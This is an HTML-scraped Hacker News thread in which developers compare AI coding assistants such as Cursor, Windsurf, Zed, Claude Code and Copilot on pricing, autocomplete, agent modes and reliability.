      <center><a id="up_43960122" href="https://news.ycombinator.com/vote?id=43960122&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>Yup, choose your model and pay as you go, like commodities like rice and water. The others played games with me to minimize context and use cheaper models (such as 3 modes, daily credits etc, using most expensive model etc).</p><p>Also the --watch mode is the most productive interface of using your editor, no need of extra textboxes with robot faces.</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="43960191"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_43960191" href="https://news.ycombinator.com/vote?id=43960191&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>fwiw. Gemini-*, which is available in Aider, isn't Pay As You Go (payg) but post paid, which means you get a bill at the end of the month and not the OpenAI/others model of charging up credits before you can use the service.</p>
              </div></td></tr>
        </tbody></table></td></tr>
                <tr id="43960659"><td><table>  <tbody><tr>    <td indent="3"><img src="https://news.ycombinator.com/s.gif" height="1" width="120"></td><td>
      <center><a id="up_43960659" href="https://news.ycombinator.com/vote?id=43960659&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>I guess this is a good reason to consider things like openrouter. Turns it into a prepaid service.</p>
              </div></td></tr>
        </tbody></table></td></tr>
                              <tr id="43960640"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43960640" href="https://news.ycombinator.com/vote?id=43960640&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>I'm with Cursor for the simple reason it is in practice unlimited. Honestly the slow requests after 500 per month are fast enough. Will I stay with Cursor? No, ill switch the second something better comes along.</p>
              </div></td></tr>
        </tbody></table></td></tr>
                <tr id="43960866"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_43960866" href="https://news.ycombinator.com/vote?id=43960866&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>Same. Love the "slow but free" model, I hope they can continue providing it, I love paying only $20/m instead of having a pay by usage.</p><p>I've been building SO MANY small apps and web apps in the latest months, best $20/m ever spent.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43960969"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_43960969" href="https://news.ycombinator.com/vote?id=43960969&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>I'm cursor with claude 3.7</p><p>Somehow other models don't work as well with it. ,,auto'' is the work.</p><p>Still, I hate it when it deletes all my unit tests to ,,make them pass''</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43960707"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_43960707" href="https://news.ycombinator.com/vote?id=43960707&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>Cursor is acceptable because for the price it's unbeatable. Free, unlimited requests are great. But by itself, Cursor is not anything special. It's only interesting because they pay Claude or Gemini from their pockets.</p><p>Ideally, things like RooCode + Claude are much better, but you need infinite money glitch.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43960678"><td></td></tr>
                  <tr id="43959909"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43959909" href="https://news.ycombinator.com/vote?id=43959909&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>I am betting on myself.</p><p>I built a minimal agentic framework (with editing capability) that works for a lot of my tasks with just seven tools: read, write, diff, browse, command, ask and think.</p><p>One thing I'm proud of is the ability to have it be more proactive in making changes and taking next action by just disabling the `ask` tool.</p><p>I won't say it is better than any of the VSCode forks, but it works for 70% of my tasks in an understandable manner. As for the remaining stuff, I can always use Cursor/Windsurf in a complementary manner.</p><p>It is open, have a look at <a href="https://github.com/aperoc/toolkami">https://github.com/aperoc/toolkami</a> if it interests you.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43961130"><td></td></tr>
            <tr id="43960864"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43960864" href="https://news.ycombinator.com/vote?id=43960864&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>For daily work - neither. They basically promote the style of work where you end up with mediocre code that you don't fully understand, and with time the situation gets worse.</p><p>I get much better result by asking specific question to a model that has huge context (Gemini) and analyzing the generated code carefully. That's the opposite of the style of work you get with Cursor or Windsurf.</p><p>Is it less efficient? If you are paid by LoCs, sure. But for me the quality and long-term maintainability are far more important. And especially the Tab autocomplete feature was driving me nuts, being wrong roughly half of the time and basically just interrupting my flow.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43960810"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43960810" href="https://news.ycombinator.com/vote?id=43960810&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>VS Code with GitHub Copilot works great, though they are usually a little late to add features compared to Cursor or Windsurf. I use the 'Edit' feature the most.</p><p>Windsurf I think has more features, but I find it slower compared to others.</p><p>Cursor is pretty fast, and I like how it automatically suggests completion even when moving my cursor to a line of code. (Unlike others where you need to 'trigger' it by typing a text first)</p><p>Honorable mention: Supermaven. It was the first and fastest AI autocomplete I used. But it's no longer updated since they were acquired by Cursor.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43960189"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43960189" href="https://news.ycombinator.com/vote?id=43960189&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>I’ve been using Zed Agent with GitHub Copilot’s models, but with GitHub planning to limit usage, I’m exploring alternatives.</p><p>Now I'm testing Claude Code’s $100 Max plan. It feels like magic - editing code and fixing compile errors until it builds. The downside is I’m reviewing the code a lot less since I just let the agent run.</p><p>So far, I’ve only tried it on vibe coding game development, where every model I’ve tested struggles. It says “I rewrote X to be more robust and fixed the bug you mentioned,” yet the bug still remains.</p><p>I suspect it will work better for backend web development I do for work: write a failing unit test, then ask the agent to implement the feature and make the test pass.</p><p>Also, give Zed’s Edit Predictions a try. When refactoring, I often just keep hitting Tab to accept suggestions throughout the file.</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="43960254"><td></td></tr>
                <tr id="43960412"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_43960412" href="https://news.ycombinator.com/vote?id=43960412&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>It feels like magic when it works and it at least gets the code to compile. Other models* would usually return a broken code. Specially when using a new release of a library. All the models use the old function signatures, but Claud Code then sees compile error and fixes it.</p><p>Compared to Zed Agent, Claude Code is: 
- Better at editing files. Zed would sometimes return the file content in the chatbox instead of updating it. Zed Agent also inserted a new function in the middle of the existing function. 
- Better at running tests/compiling. Zed struggled with nix environment and I don't remember it going to the update code -&gt; run code -&gt; update code feedback loop.</p><p>With this you can leave Claude Code alone for a few minutes, check back and give additional instructions. With Zed Agent it was more of a constantly monitoring / copy pasting and manually verifying everything.</p><p>*I haven't tested many of the other tools mentioned here, this is mostly my experience with Zed and copy/pasting code to AI.</p><p>I plan to test other tools when my Claude Code subscription expires next month.</p></div></td></tr>
        </tbody></table></td></tr>
                        <tr id="43960966"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43960966" href="https://news.ycombinator.com/vote?id=43960966&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>Cursor is good for basic stuff but Windsurf consistently solves issues Cursor fails on even after 40+ mins of retries and prompting changes.</p><p>Cursor is very lazy about looking beyond the current context or even context at all sometimes it feels it’s trying to one shot a guess without looking deeper.</p><p>Bad thing about Windsurf is the plans are pretty limited and the unlimited “cascade base” feels dumb the times I used it so ultimately I use Cursor until I hit a wall then switch to Windsurf.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43960212"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43960212" href="https://news.ycombinator.com/vote?id=43960212&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>OP probably means to keep using vscode. Honestly, best thing you can do is just try each for a few weeks. Feature comparison tables only say so much, particularly because the terminology is still in a state of flux.</p><p>I’ve personally never felt at home in vscode. If you’re open to switching, definitely check out Zed, as others are suggesting.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43960897"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43960897" href="https://news.ycombinator.com/vote?id=43960897&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>Using Windsurf since the start and I am satisfied. Didn't look beyond it. Focused on actually doing the coding. It's impossible to keep up with daily AI news and if something groundbreaking happens it will go viral.</p>
              </div></td></tr>
        </tbody></table></td></tr>
            <tr id="43960180"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43960180" href="https://news.ycombinator.com/vote?id=43960180&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>Cursor has for me had the best UX and results until now. Trae's way of adding context is way too annoying. Windsurf has minor UI-issues all over. Options that are extensions in VSCode do not cut it in turn of providing fantastic UI/UX because of the API not supporting it.</p>
              </div></td></tr>
        </tbody></table></td></tr>
            <tr id="43960320"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43960320" href="https://news.ycombinator.com/vote?id=43960320&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>Cursor: Autocomplete is really good. At a time when I compared them, it was without a doubt better than Githib Copilot autocomplete. Cmd-K - insert/edit snippet at cursor - is good when you use good old Sonnet 3.5. ;;; Agent mode, is, honestly, quite disappointing; it doesn't feel like they put a lot of thought into prompting and wrapping LLM calls. Sometimes it just fails to submit code changes. Which is especially bad as they charge you for every request. Also I think they over-charge for Gemini, and Gemini integration is especially poor.</p><p>My reference for agent mode is Claude Code. It's far from perfect, but it uses sub-tasks and summarization using smaller haiku model. That feels way more like a coherent solution compared to Cursor. Also Aider ain't bad when you're OK with more manual process.</p><p>Windsurf: Have only used it briefly, but agent mode seems somewhat better thought out. For example, they present possible next steps as buttons. Some reviews say it's even more expensive than Cursor in agent mode.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43960904"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43960904" href="https://news.ycombinator.com/vote?id=43960904&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>Has anyone had any joy using a local model? Or is it still too slow?</p><p>On something like a M4 Macbook Pro can local models replace the connection to OpenAi/Anthropic?</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43960961"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43960961" href="https://news.ycombinator.com/vote?id=43960961&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>It might seem contrary to the current trend, but I've recently returned to using nvim as my daily driver after years with VS Code. This shift wasn't due to resource limitations but rather the unnecessary strain from agentic features consuming high amounts of resources.</p>
              </div></td></tr>
        </tbody></table></td></tr>
            <tr id="43960693"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43960693" href="https://news.ycombinator.com/vote?id=43960693&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>I wish your own coding would just be augmented like somebody looking over your shoulder. The problem with the current AI coding is that you don't know your code base anymore. Basically, like somebody helping you figure out stuff faster, update documentation etc.</p>
              </div></td></tr>
        </tbody></table></td></tr>
            <tr id="43959889"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43959889" href="https://news.ycombinator.com/vote?id=43959889&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>I really like Zed. Have not tried any of the mentioned by op. 
Zed I feel like is getting somewhere that can replace Sublime Text completely (but not there yet).</p>
              </div></td></tr>
        </tbody></table></td></tr>
                <tr id="43960188"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_43960188" href="https://news.ycombinator.com/vote?id=43960188&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>Zed is an editor firslty.. The Ops has mentioned options which are AI development "agents" basically.</p>
              </div></td></tr>
        </tbody></table></td></tr>
                <tr id="43960348"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_43960348" href="https://news.ycombinator.com/vote?id=43960348&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>AI aided development has first class support in Zed.</p><p>Ie. it's not a "plugin" but built-in ecosystem developed by core team.</p><p>Speed of iterations on new features is quite impressive.</p><p>Their latest agentic editing update basically brought claude code cli to the editor.</p><p>Most corporations don't have direct access to arbitrary LLMs but through Microsoft's Github's Copilot they do – and you can use models through copilot and other providers like Ollama – which is great for work.</p><p>With their expertise (team behind pioneering tech like electron, atom, teletype, tree sitter, building their own gpu based cross platform ui etc.) and velocity it seems that they're positioned to outpace competition.</p><p>Personally I'd say that their tech is maybe two orders of magnitude more valuable than windsurf?</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="43960670"><td><table>  <tbody><tr>    <td indent="3"><img src="https://news.ycombinator.com/s.gif" height="1" width="120"></td><td>
      <center><a id="up_43960670" href="https://news.ycombinator.com/vote?id=43960670&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>I don't dispite Zed is great, I actually am using it myself, but it's an editor first and foremost. The OP, to me at least seems to be asking more-so about the AI agent comparisons.</p>
              </div></td></tr>
        </tbody></table></td></tr>
                <tr id="43960820"><td></td></tr>
                                    <tr id="43960777"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43960777" href="https://news.ycombinator.com/vote?id=43960777&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>Cursor. Good price, the predictive next edit is great, good enough with big code bases and with the auto mode i dont even spend all my prem requests.</p><p>I've tried VScode with copilot a couple of times and its frustrating, you have to point out individual files for edits but project wide requests are a pain.</p><p>My only pain is the workflow for developing mobile apps where I have to switch back and forth between Android Studio and Xcode as vscode extensions for mobile are not so good</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43960385"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43960385" href="https://news.ycombinator.com/vote?id=43960385&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>Since this topic is closely related to my new project, I’d love to hear your opinion on it.</p><p>I’m thinking of building an AI IDE that helps engineers write production quality code quickly when working with AI. The core idea is to introduce a new kind of collaboration workflow.</p><p>You start with the same kind of prompt, like “I want to build this feature...”, but instead of the model making changes right away, it proposes an architecture for what it plans to do, shown from a bird’s-eye view in the 2D canvas.</p><p>You collaborate with the AI on this architecture to ensure everything is built the way you want. You’re setting up data flows, structure, and validation checks. Once you’re satisfied with the design, you hit play, and the model writes the code.</p><p>Website (in progress): <a href="https://skylinevision.ai/" rel="nofollow">https://skylinevision.ai</a></p><p>YC Video showing prototype that I just finished yesterday: <a href="https://www.youtube.com/watch?v=DXlHNJPQRtk" rel="nofollow">https://www.youtube.com/watch?v=DXlHNJPQRtk</a></p><p>Karpathy’s post that talks about this:
<a href="https://x.com/karpathy/status/1917920257257459899" rel="nofollow">https://x.com/karpathy/status/1917920257257459899</a></p><p>Thoughts? Do you think this workflow has a chance of being adopted?</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="43960663"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_43960663" href="https://news.ycombinator.com/vote?id=43960663&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>Looks like an antidote for "vibe coding", like it. When are you planning to release something that could be tried? Is this open source?</p>
              </div></td></tr>
        </tbody></table></td></tr>
                <tr id="43960729"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_43960729" href="https://news.ycombinator.com/vote?id=43960729&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>I believe we can have a beta release in September, and yes, we plan to open-source the editor.</p><p>PS. I’m stealing the ‘antidote to “vibe coding”’ phrase :)</p></div></td></tr>
        </tbody></table></td></tr>
                  <tr id="43960568"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_43960568" href="https://news.ycombinator.com/vote?id=43960568&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>I quite liked the video. Hope you get to launch the product and I could try it out some day.</p><p>The only thing that I kept thinking about was - if there is a correction needed- you have to make it fully by hand. Find everything and map. However, if the first try was way off , I would like to enter from "midpoint" a correction that I want. So instead of fixing 50%, I would be left with maybe 10 or 20. Don't know if you get what I mean.</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="43960603"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_43960603" href="https://news.ycombinator.com/vote?id=43960603&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>Yes, the idea is to ‘speak/write’ to the local model to fix those little things so you don’t have to do them by hand. I actually already have a fine-tuned Qwen model running on Apple’s MLX to handle some of that, but given the hard YC deadline, it didn’t make it into the demo.</p><p>Eventually, you’d say, ‘add an additional layer, TopicsController, between those two files,’ and the local model would do it quickly without a problem, since it doesn’t involve complicated code generation. You’d only use powerful remote models at the end.</p></div></td></tr>
        </tbody></table></td></tr>
                  <tr id="43960619"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_43960619" href="https://news.ycombinator.com/vote?id=43960619&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>Just watched the demo video and thought it is a very interesting approach to development, I will definitely be following this project. Good Luck.</p>
              </div></td></tr>
        </tbody></table></td></tr>
                  <tr id="43960064"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43960064" href="https://news.ycombinator.com/vote?id=43960064&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>Amazon Q. Claude Code is great (the best imho, what everything else measures against right now), and Amazon Q seems almost as good and for the first week I've been using it I'm still on the free tier.</p><p>The flat pricing of Claude Code seems tempting, but it's probably still cheaper for me to go with usage pricing. I feel like loading my Anthropic account with the minimum of $5 each time would last me 2-3 days depending on usage. Some days it wouldn't last even a day.</p><p>I'll probably give Open AI's Codex a try soon, and also circle back to Aider after not using it for a few months.</p><p>I don't know if I misundersand something with Cursor or Copilot. It seems so much easier to use Claude Code than Cursor, as Claude Code has many more tools for figuring things out. Cursor also required me to add files to the context, which I thought it should 'figure out' on its own.</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="43960817"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_43960817" href="https://news.ycombinator.com/vote?id=43960817&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>I remember asking Amazon Q something and it wouldn’t reply cuz of security policy or something. It was as far as I can remember a legit question around Iam policy which I was trying to configure. I figured it out back in Google search.</p>
              </div></td></tr>
        </tbody></table></td></tr>
            <tr id="43960240"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_43960240" href="https://news.ycombinator.com/vote?id=43960240&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>&gt; I don't know if I misundersand something with Cursor or Copilot. It seems so much easier to use Claude Code than Cursor, as Claude Code has many more tools for figuring things out. Cursor also required me to add files to the context, which I thought it should 'figure out' on its own.</p><p>Cursor can find files on its own. But if you point it in the right direction it has far better results than Claude code.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43960087"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_43960087" href="https://news.ycombinator.com/vote?id=43960087&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>this is the first time I am seeing someone says good things about Amazon Q</p><p>Do they publish any benchmark sheet on how it compares against others?</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="43960292"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_43960292" href="https://news.ycombinator.com/vote?id=43960292&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>It is currently at top3 in swe bench verified.</p><p>It went through multiple stages of upgrades and I would say at this stage it is better than copilot. Fundamentally it is as good as cursor or windsurf but lacks some features and cannot match their speed of release. If you re on aws tho its a compelling offering.</p></div></td></tr>
        </tbody></table></td></tr>
                        <tr id="43959991"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43959991" href="https://news.ycombinator.com/vote?id=43959991&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>Windsurf at the moment. It now can run multiple "flows" in parallel, so I can set one cascade off to look into a bug somewhere while another cascade implements a feature elswhere in the code base. The LLMs spit out their tokens in the background, I drop in eventually to reveiew and accept or ask for further changes.</p>
              </div></td></tr>
        </tbody></table></td></tr>
                <tr id="43960167"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_43960167" href="https://news.ycombinator.com/vote?id=43960167&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>Cursor offers this too - open different tabs in chat and ask for different changes; they’ll run in parallel.</p>
              </div></td></tr>
        </tbody></table></td></tr>
            <tr id="43960258"><td></td></tr>
            <tr id="43960103"><td></td></tr>
                  <tr id="43960666"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43960666" href="https://news.ycombinator.com/vote?id=43960666&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p><a href="https://nonbios.ai/" rel="nofollow">https://nonbios.ai</a> - [Disclosure: I am working on this.]</p><p>- We are in public beta and free for now.</p><p>- Fully Agentic. Controllable and Transparent. Agent does all the work, but keeps you in the loop. You can take back control anytime and guide it.</p><p>- Not an IDE, so don't compete with VSCode forks. Interface is just a chatbox.</p><p>- More like Replit - but full stack focussed. You can build backend services.</p><p>- Videos are up at youtube.com/@nonbios</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43960567"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43960567" href="https://news.ycombinator.com/vote?id=43960567&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>I just use Copilot (across VS Code, VS etc), it lets you pick the model you want and it's a fixed monthly cost (and there is a free tier). They have most of the core features of these other tools now.</p><p>Cursor, Windsurf et al have no "moat" (in startup speak), in that a sufficiently resourced organization (e.g. Microsoft) can just copy anything they do well.</p><p>VS code/Copilot has millions of users, cursor etc have hundreds of thousands of users. Google claims to have "hundreds of millions" of users but we can be pretty sure that they are quoting numbers for their search product.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43960284"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43960284" href="https://news.ycombinator.com/vote?id=43960284&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>Claude Code.
And... Junie in Jetbrains IDE. It appeared recently and I'm really impressed by its quality. I think it is on the level of Claude Code.</p>
              </div></td></tr>
        </tbody></table></td></tr>
                <tr id="43960314"><td></td></tr>
                <tr id="43960473"><td></td></tr>
                <tr id="43961094"><td><table>  <tbody><tr>    <td indent="3"><img src="https://news.ycombinator.com/s.gif" height="1" width="120"></td><td>
      <center><a id="up_43961094" href="https://news.ycombinator.com/vote?id=43961094&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>Junie in Ask mode:</p><p>&gt; Which LLM are you?</p><p>&gt; I am Claude, an AI assistant created by Anthropic. In this interface, I'm operating as "Junie," a helpful assistant designed to explore codebases and answer questions about projects. I'm built on Anthropic's large language model technology, specifically the Claude model family.</p><p>Jetbrains wider AI tools let you choose the model that gets used but as far as I can tell Junie doesn't. That said, it works great.</p></div></td></tr>
        </tbody></table></td></tr>
                              <tr id="43961040"><td></td></tr>
            <tr id="43960386"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43960386" href="https://news.ycombinator.com/vote?id=43960386&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>Recently started using Cursor for adding a new feature on a small codebase for work, after a couple of years where I didn't code. It took me a couple of tries to figure out how to work with the tool effectively, but it worked great! I'm now learning how to use it with TaskMaster, it's such a different way to do and play with software. Oh, one important note: I went with Cursor also because of the pricing, that's despite confusing in term of fast vs slow requests, it smells less consumption base.</p><p>BTW There's a new OSS competitor in town that got the front a couple of days ago - Void: Open-source Cursor alternative <a href="https://news.ycombinator.com/item?id=43927926">https://news.ycombinator.com/item?id=43927926</a></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43960871"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43960871" href="https://news.ycombinator.com/vote?id=43960871&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>Considering Microsoft is closing down on the ecosystem, I'd pick VSCode with Copilot over those two.</p><p>It's a matter of time before they're shuttered or their experience gets far worse.</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="43960880"><td></td></tr>
                  <tr id="43959987"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43959987" href="https://news.ycombinator.com/vote?id=43959987&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>I evaluated Windsurf at a friend's recommendation around half a year ago and found that it could not produce any useful behaviors on files above a thousand lines or so. I understand this is mostly a property of the model, but certainly also a property of the approach used by the editor of just tossing the entire file in, yeah? I haven't tried any of these products since then, but it might be worth another shot because Gemini might be able to handle these files.</p>
              </div></td></tr>
        </tbody></table></td></tr>
                <tr id="43960303"><td></td></tr>
                  <tr id="43960047"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43960047" href="https://news.ycombinator.com/vote?id=43960047&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>I've had trials for both running and tested both on the same codebases.</p><p>Cursor works roughly how I've expected. It reads files and either gets it right or wrong in agent mode.</p><p>Windsurf seems restricted to reading files 50 lines at a time, and often will stop after 200 lines [0]. When dealing with existing code I've been getting poorer results than Cursor.</p><p>As to autocomplete: perhaps I haven't set up either properly (for PHP) but the autocomplete in both is good for pattern matching changes I make, and terrible for anything that require knowledge of what methods an object has, the parameters a method takes etc. They both hallucinate wildly, and so I end up doing bits of editing in Cursor/Windsurf and having the same project open in PhpStorm and making use of its intellisense.</p><p>I'm coming to the end of both trials and the AI isn't adding enough over Jetbrains PhpStorm's built in features, so I'm going back to that until I figure out how to reduce hallucinations.</p><p>0. <a href="https://www.reddit.com/r/Codeium/comments/1hsn1xw/report_from_a_windsurf_user/" rel="nofollow">https://www.reddit.com/r/Codeium/comments/1hsn1xw/report_fro...</a></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43960297"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
